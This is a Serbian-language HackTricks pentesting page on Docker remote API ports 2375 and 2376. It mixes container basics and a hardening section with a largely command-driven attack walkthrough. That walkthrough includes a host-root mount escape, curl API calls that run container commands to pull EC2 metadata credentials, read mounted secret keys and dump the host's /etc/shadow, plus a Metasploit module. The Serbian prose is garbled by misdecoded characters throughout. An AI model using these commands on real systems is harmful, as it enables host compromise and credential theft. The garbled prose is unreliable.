# 2375, 2376 Testiranje Docker-a

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJEM**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) je **dark-web** pretraÅ¾ivaÄ koji nudi **besplatne** funkcionalnosti za proveru da li je kompanija ili njeni korisnici **kompromitovani** od strane **malvera za kraÄ‘u podataka**.

Primarni cilj WhiteIntel-a je borba protiv preuzimanja naloga i napada ransomware-a koji proizilaze iz malvera za kraÄ‘u informacija.

MoÅ¾ete posetiti njihovu veb stranicu i isprobati njihovu maÅ¡inu za **besplatno** na:

{% embed url="https://whiteintel.io" %}

***

### Osnove Docker-a

#### Å ta je

Docker je **vodeÄ‡a platforma** u industriji **kontejnerizacije**, predvodeÄ‡i **kontinuiranu inovaciju**. OmoguÄ‡ava jednostavno kreiranje i distribuciju aplikacija, obuhvatajuÄ‡i **tradicionalne do futuristiÄke**, i obezbeÄ‘uje njihovo **sigurno implementiranje** u razliÄitim okruÅ¾enjima.

#### Osnovna arhitektura Docker-a

* [**containerd**](http://containerd.io): Ovo je **osnovno izvrÅ¡no okruÅ¾enje** za kontejnere, zaduÅ¾eno za sveobuhvatno **upravljanje Å¾ivotnim ciklusom kontejnera**. To ukljuÄuje rukovanje **transferom i skladiÅ¡tenjem slika**, kao i nadgledanje **izvrÅ¡avanja, praÄ‡enja i umreÅ¾avanja** kontejnera. **Detaljnije uvide** o containerd-u **dalje istraÅ¾ujemo**.
* **Container-shim** igra kljuÄnu ulogu kao **posrednik** u rukovanju **glavoboljnim kontejnerima**, besprekorno preuzimajuÄ‡i od **runc**-a nakon Å¡to su kontejneri inicijalizovani.
* [**runc**](http://runc.io): PoÅ¡tovan zbog svojih moguÄ‡nosti **laganog i univerzalnog izvrÅ¡nog okruÅ¾enja kontejnera**, runc je usklaÄ‘en sa **OCI standardom**. Koristi ga containerd za **pokretanje i upravljanje kontejnerima** prema **OCI smernicama**, evoluirajuÄ‡i iz originalnog **libcontainer**-a.
* [**grpc**](http://www.grpc.io) je kljuÄan za **olakÅ¡avanje komunikacije** izmeÄ‘u containerd-a i **docker-engine**, osiguravajuÄ‡i **efikasnu interakciju**.
* [**OCI**](https://www.opencontainers.org) je kljuÄan za odrÅ¾avanje **OCI specifikacija** za izvrÅ¡no okruÅ¾enje i slike, pri Äemu su najnovije verzije Docker-a **usaglaÅ¡ene sa OCI standardima za sliku i izvrÅ¡no okruÅ¾enje**.

#### Osnovne komande
```bash
docker version #Get version of docker client, API, engine, containerd, runc, docker-init
docker info #Get more infomarion about docker settings
docker pull registry:5000/alpine #Download the image
docker inspect <containerid> #Get info of the contaienr
docker network ls #List network info
docker exec -it <containerid> /bin/sh #Get shell inside a container
docker commit <cotainerid> registry:5000/name-container #Update container
docker export -o alpine.tar <containerid> #Export container as tar file
docker save -o ubuntu.tar <image> #Export an image
docker ps -a #List running and stopped containers
docker stop <containedID> #Stop running container
docker rm <containerID> #Remove container ID
docker image ls #List images
docker rmi <imgeID> #Remove image
docker system prune -a
#This will remove:
#  - all stopped containers
#  - all networks not used by at least one container
#  - all images without at least one container associated to them
#  - all build cache
```
#### Containerd

**Containerd** je posebno razvijen da zadovolji potrebe platformi za kontejnere poput **Docker-a i Kubernetes-a**, meÄ‘u ostalima. Cilj mu je **simplifikacija izvrÅ¡avanja kontejnera** na razliÄitim operativnim sistemima, ukljuÄujuÄ‡i Linux, Windows, Solaris i druge, apstrahujuÄ‡i funkcionalnosti specifiÄne za operativni sistem i sistemske pozive. Cilj Containerd-a je da ukljuÄi samo osnovne funkcije potrebne njegovim korisnicima, teÅ¾i da izostavi nepotrebne komponente. MeÄ‘utim, postizanje ovog cilja u potpunosti se smatra izazovnim.

KljuÄna dizajnerska odluka je da **Containerd ne upravlja mreÅ¾om**. MreÅ¾enje se smatra kljuÄnim elementom u distribuiranim sistemima, sa kompleksnostima poput definisanja mreÅ¾e softverom (SDN) i otkrivanja servisa koje se znaÄajno razlikuju od jedne platforme do druge. Stoga, Containerd ostavlja upravljanje mreÅ¾om da ga upravljaju platforme koje podrÅ¾ava.

Iako **Docker koristi Containerd** za pokretanje kontejnera, vaÅ¾no je napomenuti da Containerd podrÅ¾ava samo podskup funkcionalnosti Docker-a. Konkretno, Containerd nema moguÄ‡nosti upravljanja mreÅ¾om prisutne u Docker-u i ne podrÅ¾ava direktno kreiranje Docker rojeva. Ova razlika istiÄe fokusiranu ulogu Containerd-a kao okruÅ¾enja za izvrÅ¡avanje kontejnera, prepuÅ¡tajuÄ‡i specijalizovanije funkcionalnosti platformama sa kojima se integriÅ¡e.
```bash
#Containerd CLI
ctr images pull --skip-verify --plain-http registry:5000/alpine:latest #Get image
ctr images list #List images
ctr container create registry:5000/alpine:latest alpine #Create container called alpine
ctr container list #List containers
ctr container info <containerName> #Get container info
ctr task start <containerName> #You are given a shell inside of it
ctr task list #Get status of containers
ctr tasks attach <containerName> #Get shell in running container
ctr task pause <containerName> #Stop container
ctr tasks resume <containerName> #Resume cotainer
ctr task kill -s SIGKILL <containerName> #Stop running container
ctr container delete <containerName>
```
#### Podman

**Podman** je open-source kontejnerski motor koji se pridrÅ¾ava [Open Container Initiative (OCI) standarda](https://github.com/opencontainers), razvijen i odrÅ¾avan od strane Red Hata. IstiÄe se od Docker-a nekoliko razliÄitih karakteristika, posebno svojom **arhitekturom bez demona** i podrÅ¡kom za **rootless kontejnere**, omoguÄ‡avajuÄ‡i korisnicima da pokreÄ‡u kontejnere bez privilegija root korisnika.

Podman je dizajniran da bude kompatibilan sa Docker-ovim API-jem, omoguÄ‡avajuÄ‡i koriÅ¡Ä‡enje Docker CLI komandi. Ova kompatibilnost se proÅ¡iruje na njegov ekosistem, koji ukljuÄuje alate poput **Buildah** za izgradnju kontejnerskih slika i **Skopeo** za operacije sa slikama poput push, pull i inspect. ViÅ¡e detalja o ovim alatima moÅ¾ete pronaÄ‡i na njihovoj [GitHub stranici](https://github.com/containers/buildah/tree/master/docs/containertools).

**KljuÄne Razlike**

* **Arhitektura**: Za razliku od Docker-ovog modela klijent-server sa pozadinskim demonom, Podman funkcioniÅ¡e bez demona. Ovaj dizajn znaÄi da kontejneri pokreÄ‡u sa privilegijama korisnika koji ih pokreÄ‡e, poboljÅ¡avajuÄ‡i sigurnost eliminacijom potrebe za pristupom root korisnika.
* **Systemd Integracija**: Podman se integriÅ¡e sa **systemd**-om za upravljanje kontejnerima, omoguÄ‡avajuÄ‡i upravljanje kontejnerima putem systemd jedinica. Ovo se razlikuje od Docker-a koji koristi systemd uglavnom za upravljanje Docker demon procesom.
* **Rootless Kontejneri**: KljuÄna karakteristika Podman-a je njegova sposobnost pokretanja kontejnera pod privilegijama korisnika koji ih pokreÄ‡e. Ovaj pristup minimizira rizike povezane sa probijanjem kontejnera osiguravajuÄ‡i da napadaÄi dobiju samo privilegije kompromitovanog korisnika, a ne pristup root korisniku.

Pristup Podman-a nudi sigurnu i fleksibilnu alternativu Docker-u, naglaÅ¡avajuÄ‡i upravljanje privilegijama korisnika i kompatibilnost sa postojeÄ‡im Docker radnim tokovima.

{% hint style="info" %}
Imajte na umu da kako podman ima za cilj podrÅ¾ati isti API kao docker, moÅ¾ete koristiti iste komande sa podman-om kao sa docker-om kao Å¡to su:
```bash
podman --version
podman info
pdoman images ls
podman ls
```
{% endhint %}

### Osnovne informacije

Udaljeni API se podrazumevano pokreÄ‡e na portu 2375 kada je omoguÄ‡en. Usluga podrazumevano ne zahteva autentifikaciju, Å¡to omoguÄ‡ava napadaÄu da pokrene privilegovan Docker kontejner. KoriÅ¡Ä‡enjem udaljenog API-ja moguÄ‡e je povezati hostove / (korenski direktorijum) sa kontejnerom i Äitati/pisati fajlove u okruÅ¾enju hosta. 

**Podrazumevani port:** 2375
```
PORT    STATE SERVICE
2375/tcp open  docker
```
### Enumeracija

#### RuÄno

Imajte na umu da za enumeraciju docker API-ja moÅ¾ete koristiti `docker` komandu ili `curl` kao u sledeÄ‡em primeru:
```bash
#Using curl
curl -s http://open.docker.socket:2375/version | jq #Get version
{"Platform":{"Name":"Docker Engine - Community"},"Components":[{"Name":"Engine","Version":"19.03.1","Details":{"ApiVersion":"1.40","Arch":"amd64","BuildTime":"2019-07-25T21:19:41.000000000+00:00","Experimental":"false","GitCommit":"74b1e89","GoVersion":"go1.12.5","KernelVersion":"5.0.0-20-generic","MinAPIVersion":"1.12","Os":"linux"}},{"Name":"containerd","Version":"1.2.6","Details":{"GitCommit":"894b81a4b802e4eb2a91d1ce216b8817763c29fb"}},{"Name":"runc","Version":"1.0.0-rc8","Details":{"GitCommit":"425e105d5a03fabd737a126ad93d62a9eeede87f"}},{"Name":"docker-init","Version":"0.18.0","Details":{"GitCommit":"fec3683"}}],"Version":"19.03.1","ApiVersion":"1.40","MinAPIVersion":"1.12","GitCommit":"74b1e89","GoVersion":"go1.12.5","Os":"linux","Arch":"amd64","KernelVersion":"5.0.0-20-generic","BuildTime":"2019-07-25T21:19:41.000000000+00:00"}

#Using docker
docker -H open.docker.socket:2375 version #Get version
Client: Docker Engine - Community
Version:           19.03.1
API version:       1.40
Go version:        go1.12.5
Git commit:        74b1e89
Built:             Thu Jul 25 21:21:05 2019
OS/Arch:           linux/amd64
Experimental:      false

Server: Docker Engine - Community
Engine:
Version:          19.03.1
API version:      1.40 (minimum version 1.12)
Go version:       go1.12.5
Git commit:       74b1e89
Built:            Thu Jul 25 21:19:41 2019
OS/Arch:          linux/amd64
Experimental:     false
containerd:
Version:          1.2.6
GitCommit:        894b81a4b802e4eb2a91d1ce216b8817763c29fb
runc:
Version:          1.0.0-rc8
GitCommit:        425e105d5a03fabd737a126ad93d62a9eeede87f
docker-init:
Version:          0.18.0
GitCommit:        fec3683
```
Ako moÅ¾ete **kontaktirati udaljeni docker API pomoÄ‡u `docker` komande** moÅ¾ete **izvrÅ¡iti** bilo koju od **docker** [**prethodno komentarisanih komandi**](2375-pentesting-docker.md#basic-commands) kako biste komunicirali sa servisom.

{% hint style="info" %}
MoÅ¾ete `export DOCKER_HOST="tcp://localhost:2375"` i **izbeÄ‡i** koriÅ¡Ä‡enje `-H` parametra sa docker komandom
{% endhint %}

**Brzo eskaliranje privilegija**
```bash
docker run -it -v /:/host/ ubuntu:latest chroot /host/ bash
```
**Curl**

Ponekad Ä‡ete videti **2376** otvoren za **TLS** krajnju taÄku. Nisam uspeo da se poveÅ¾em sa njom pomoÄ‡u docker klijenta, ali je moguÄ‡e to uraditi sa curl-om.
```bash
#List containers
curl â€“insecure https://tlsopen.docker.socket:2376/containers/json | jq
#List processes inside a container
curl â€“insecure https://tlsopen.docker.socket:2376/containers/f9cecac404b01a67e38c6b4111050c86bbb53d375f9cca38fa73ec28cc92c668/top | jq
#Set up and exec job to hit the metadata URL
curl â€“insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/blissful_engelbart/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "wget -qO- http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"]}'
#Get the output
curl â€“insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/exec/4353567ff39966c4d231e936ffe612dbb06e1b7dd68a676ae1f0a9c9c0662d55/start -d '{}'
# list secrets (no secrets/swarm not set up)
curl -s â€“insecure https://tlsopen.docker.socket:2376/secrets | jq
#Check what is mounted
curl â€“insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "mount"]}'
#Get the output by starting the exec
curl â€“insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/exec/7fe5c7d9c2c56c2b2e6c6a1efe1c757a6da1cd045d9b328ea9512101f72e43aa/start -d '{}'
#Cat the mounted secret
curl â€“insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /run/secrets/registry-key.key"]}'
#List service (If you have secrets, itâ€™s also worth checking out services in case they are adding secrets via environment variables)
curl -s â€“insecure https://tls-opendocker.socket:2376/services | jq
#Creating a container that has mounted the host file system and read /etc/shadow
curl â€“insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket2376/containers/create?name=test -d '{"Image":"alpine", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}'
curl â€“insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/start?name=test
curl â€“insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /mnt/etc/shadow"]}'
curl â€“insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/exec/140e09471b157aa222a5c8783028524540ab5a55713cbfcb195e6d5e9d8079c6/start -d '{}'
#Stop the container
curl â€“insecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/stop
#Delete stopped containers
curl â€“insecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/prune
```
Ako Å¾elite viÅ¡e informacija o ovome, viÅ¡e informacija je dostupno tamo odakle sam kopirao komande: [https://securityboulevard.com/2019/02/abusing-docker-api-socket/](https://securityboulevard.com/2019/02/abusing-docker-api-socket/)

#### Automatski
```bash
msf> use exploit/linux/http/docker_daemon_tcp
nmap -sV --script "docker-*" -p <PORT> <IP>
```
### Kompromitovanje

Na sledeÄ‡oj stranici moÅ¾ete pronaÄ‡i naÄine za **izlazak iz docker kontejnera**:

{% content-ref url="../linux-hardening/privilege-escalation/docker-security/" %}
[docker-security](../linux-hardening/privilege-escalation/docker-security/)
{% endcontent-ref %}

Zloupotrebom ovoga je moguÄ‡e izaÄ‡i iz kontejnera, pokrenuti slab kontejner na udaljenoj maÅ¡ini, izaÄ‡i iz njega i kompromitovati maÅ¡inu:
```bash
docker -H <host>:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
cat /mnt/etc/shadow
```
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py)

### Eskalacija privilegija

Ako se nalazite unutar hosta koji koristi Docker, moÅ¾ete [**proÄitati ove informacije kako biste pokuÅ¡ali da poveÄ‡ate privilegije**](../linux-hardening/privilege-escalation/#writable-docker-socket).

### Otkrivanje tajni u pokrenutim Docker kontejnerima
```bash
docker ps [| grep <kubernetes_service_name>]
docker inspect <docker_id>
```
Proverite **env** (sekciju sa okruÅ¾enjskim promenljivama) za tajne informacije i moÅ¾da pronaÄ‘ete:

* Lozinke.
* IP adrese.
* Portove.
* Putanje.
* Ostalo... .

Ako Å¾elite da izvuÄete fajl:
```bash
docker cp <docket_id>:/etc/<secret_01> <secret_01>
```
### Osiguravanje vaÅ¡eg Dockera

#### Osiguravanje instalacije i koriÅ¡Ä‡enja Dockera

* MoÅ¾ete koristiti alat [https://github.com/docker/docker-bench-security](https://github.com/docker/docker-bench-security) da pregledate vaÅ¡u trenutnu docker instalaciju.
* `./docker-bench-security.sh`
* MoÅ¾ete koristiti alat [https://github.com/kost/dockscan](https://github.com/kost/dockscan) da pregledate vaÅ¡u trenutnu docker instalaciju.
* `dockscan -v unix:///var/run/docker.sock`
* MoÅ¾ete koristiti alat [https://github.com/genuinetools/amicontained](https://github.com/genuinetools/amicontained) da vidite privilegije koje Ä‡e kontejner imati kada se pokrene sa razliÄitim sigurnosnim opcijama. Ovo je korisno kako biste znali posledice koriÅ¡Ä‡enja odreÄ‘enih sigurnosnih opcija za pokretanje kontejnera:
* `docker run --rm -it r.j3ss.co/amicontained`
* `docker run --rm -it --pid host r.j3ss.co/amicontained`
* `docker run --rm -it --security-opt "apparmor=unconfined" r.j3ss.co/amicontained`

#### Osiguravanje Docker slika

* MoÅ¾ete koristiti docker sliku [https://github.com/quay/clair](https://github.com/quay/clair) da skenira vaÅ¡e druge docker slike i pronaÄ‘e ranjivosti.
* `docker run --rm -v /root/clair_config/:/config -p 6060-6061:6060-6061 -d clair -config="/config/config.yaml"`
* `clair-scanner -c http://172.17.0.3:6060 --ip 172.17.0.1 ubuntu-image`

#### Osiguravanje Dockerfile-ova

* MoÅ¾ete koristiti alat [https://github.com/buddy-works/dockerfile-linter](https://github.com/buddy-works/dockerfile-linter) da **pregledate vaÅ¡ Dockerfile** i pronaÄ‘ete sve vrste netaÄnih konfiguracija. Svaka netaÄna konfiguracija Ä‡e dobiti ID, moÅ¾ete pronaÄ‡i ovde [https://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md](https://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md) kako da ispravite svaku od njih.
* `dockerfilelinter -f Dockerfile`

![](<../.gitbook/assets/image (176).png>)

* MoÅ¾ete koristiti alat [https://github.com/replicatedhq/dockerfilelint](https://github.com/replicatedhq/dockerfilelint) da **pregledate vaÅ¡ Dockerfile** i pronaÄ‘ete sve vrste netaÄnih konfiguracija.
* `dockerfilelint Dockerfile`

![](<../.gitbook/assets/image (212).png>)

* MoÅ¾ete koristiti alat [https://github.com/RedCoolBeans/dockerlint](https://github.com/RedCoolBeans/dockerlint) da **pregledate vaÅ¡ Dockerfile** i pronaÄ‘ete sve vrste netaÄnih konfiguracija.
* `dockerlint Dockerfile`

![](<../.gitbook/assets/image (71).png>)

* MoÅ¾ete koristiti alat [https://github.com/hadolint/hadolint](https://github.com/hadolint/hadolint) da **pregledate vaÅ¡ Dockerfile** i pronaÄ‘ete sve vrste netaÄnih konfiguracija.
* `hadolint Dockerfile`

![](<../.gitbook/assets/image (501).png>)

#### Logovanje sumnjive aktivnosti

* MoÅ¾ete koristiti alat [https://github.com/falcosecurity/falco](https://github.com/falcosecurity/falco) da otkrijete **sumnjivo ponaÅ¡anje u pokrenutim kontejnerima**.
* Obratite paÅ¾nju u sledeÄ‡em odeljku kako **Falco kompajlira jezgro modula i ubacuje ga**. Nakon toga, uÄitava pravila i **poÄinje da loguje sumnjive aktivnosti**. U ovom sluÄaju je otkriveno da su pokrenuta 2 privilegovana kontejnera, od kojih je jedan imao osetljiv mount, i nakon nekoliko sekundi je otkriveno kako je shell otvoren unutar jednog od kontejnera.
```bash
docker run -it --privileged -v /var/run/docker.sock:/host/var/run/docker.sock -v /dev:/host/dev -v /proc:/host/proc:ro -v /boot:/host/boot:ro -v /lib/modules:/host/lib/modules:ro -v /usr:/host/usr:ro falco
* Setting up /usr/src links from host
* Unloading falco-probe, if present
* Running dkms install for falco

Kernel preparation unnecessary for this kernel.  Skipping...

Building module:
cleaning build area......
make -j3 KERNELRELEASE=5.0.0-20-generic -C /lib/modules/5.0.0-20-generic/build M=/var/lib/dkms/falco/0.18.0/build.............
cleaning build area......

DKMS: build completed.

falco-probe.ko:
Running module version sanity check.
modinfo: ERROR: missing module or filename.
- Original module
- No original module exists within this kernel
- Installation
- Installing to /lib/modules/5.0.0-20-generic/kernel/extra/
mkdir: cannot create directory '/lib/modules/5.0.0-20-generic/kernel/extra': Read-only file system
cp: cannot create regular file '/lib/modules/5.0.0-20-generic/kernel/extra/falco-probe.ko': No such file or directory

depmod...

DKMS: install completed.
* Trying to load a dkms falco-probe, if present
falco-probe found and loaded in dkms
2021-01-04T12:03:20+0000: Falco initialized with configuration file /etc/falco/falco.yaml
2021-01-04T12:03:20+0000: Loading rules from file /etc/falco/falco_rules.yaml:
2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/falco_rules.local.yaml:
2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/k8s_audit_rules.yaml:
2021-01-04T12:03:24+0000: Starting internal webserver, listening on port 8765
2021-01-04T12:03:24.646959000+0000: Notice Privileged container started (user=<NA> command=container:db5dfd1b6a32 laughing_kowalevski (id=db5dfd1b6a32) image=ubuntu:18.04)
2021-01-04T12:03:24.664354000+0000: Notice Container with sensitive mount started (user=<NA> command=container:4822e8378c00 xenodochial_kepler (id=4822e8378c00) image=ubuntu:modified mounts=/:/host::true:rslave)
2021-01-04T12:03:24.664354000+0000: Notice Privileged container started (user=root command=container:4443a8daceb8 focused_brahmagupta (id=4443a8daceb8) image=falco:latest)
2021-01-04T12:04:56.270553320+0000: Notice A shell was spawned in a container with an attached terminal (user=root xenodochial_kepler (id=4822e8378c00) shell=bash parent=runc cmdline=bash terminal=34816 container_id=4822e8378c00 image=ubuntu)
```
#### PraÄ‡enje Docker-a

MoÅ¾ete koristiti auditd da biste pratili Docker.

### Reference

* [https://ti8m.com/blog/Why-Podman-is-worth-a-look-.html](https://ti8m.com/blog/Why-Podman-is-worth-a-look-.html)
* [https://stackoverflow.com/questions/41645665/how-containerd-compares-to-runc](https://stackoverflow.com/questions/41645665/how-containerd-compares-to-runc)

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) je pretraÅ¾ivaÄ pokretan **dark-web**-om koji nudi **besplatne** funkcionalnosti za proveru da li je kompanija ili njeni korisnici **ugroÅ¾eni** od **malvera koji krade podatke**.

Primarni cilj WhiteIntel-a je borba protiv preuzimanja naloga i napada ransomvera koji proizilaze iz malvera koji krade informacije.

MoÅ¾ete posetiti njihovu veb lokaciju i isprobati njihovu maÅ¡inu za **besplatno** na:

{% embed url="https://whiteintel.io" %}

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA ÄŒLANSTVO**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
